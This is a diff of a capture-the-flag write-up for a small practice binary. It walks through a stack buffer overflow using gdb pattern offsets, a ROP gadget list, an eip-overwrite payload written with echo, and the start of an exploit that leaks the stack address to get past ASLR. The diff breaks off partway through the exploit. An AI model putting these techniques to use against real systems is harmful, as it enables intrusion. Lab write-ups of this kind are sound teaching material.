@@ -43,9 +43,9 @@ reads 61 bytes of input, grows stack by 0x14
 fuzzing
 =======
 
-check security features -> none
-spam input -> stack smashed, can overwrite eip
-gdb pattern scan -> offset 20
+1. check security features -> none
+2. spam input -> stack smashed, can overwrite eip
+3. gdb pattern scan -> offset 20
 
 ```sh
 gdb ./start 
@@ -55,12 +55,13 @@ run
 pattern search (value in eip after program exits)
 ```
 
-decision: binary doesn't have NX bit set, so if we write our shellcode to the stack and set eip to the address we have RCE
+4. decision: binary doesn't have NX bit set, so if we write our shellcode to the stack and set eip to the address we have RCE
 
 shellcoding
 ===========
 
-searching for rop gadgets:
+1. searching for rop gadgets:
+
 ```
 0x0804809b: adc al, 0xc3; pop esp; xor eax, eax; inc eax; int 0x80;
 0x08048099: add esp, 0x14; ret;
@@ -89,7 +90,7 @@ searching for rop gadgets:
 23 gadgets found
 ```
 
-the gadgets at 0x8048087 and x8048086 print esp, which is what we want
+2. the gadgets at 0x8048087 and x8048086 print esp, which is what we want
 
 ```
 echo -ne "AAAAAAAAAAAAAAAAAAAA\x87\x80\x04\x08" > shellcode
@@ -97,9 +98,9 @@ gdb ./start
 run < shellcode
 ```
 
-running throught netcat, it seems aslr is enabled on the server so we need to use our gadget at exploittime
+3. running throught netcat, it seems aslr is enabled on the server so we need to use our gadget at exploit-time
 
-so our exploit should look like this
+our exploit should look like this
 
 ```
 stack = (int)send((padding + le(0x8048087))
